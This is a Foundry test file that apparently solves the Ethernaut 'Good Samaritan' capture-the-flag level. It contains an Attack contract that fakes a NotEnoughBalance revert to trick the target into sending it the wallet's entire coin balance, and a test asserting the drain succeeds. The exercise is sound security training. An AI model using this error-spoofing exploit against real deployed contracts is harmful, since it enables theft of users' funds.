// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test} from "forge-std/Test.sol";
import {GoodSamaritan, Coin, Wallet} from "../GoodSamaritan.sol";

contract GoodSamaritanTest is Test {
    GoodSamaritan goodSamaritan;
    Attack attacker;

    address owner = makeAddr("owner");
 

    function setUp() public {
        vm.prank(owner);
        goodSamaritan = new GoodSamaritan();
        attacker = new Attack();
    }
    function test_Challenge27_Passed() public {
        vm.prank(address(attacker));
        goodSamaritan.requestDonation();

        Coin coin = goodSamaritan.coin();
        Wallet wallet = goodSamaritan.wallet();
        assertEq(coin.balances(address(wallet)), 0);
        assert(coin.balances(address(attacker)) != 0);
    }
}

contract Attack {
    error NotEnoughBalance();
    function notify(uint256 amount) external {
        if (amount == 10) {
        revert NotEnoughBalance();
    }

    }
}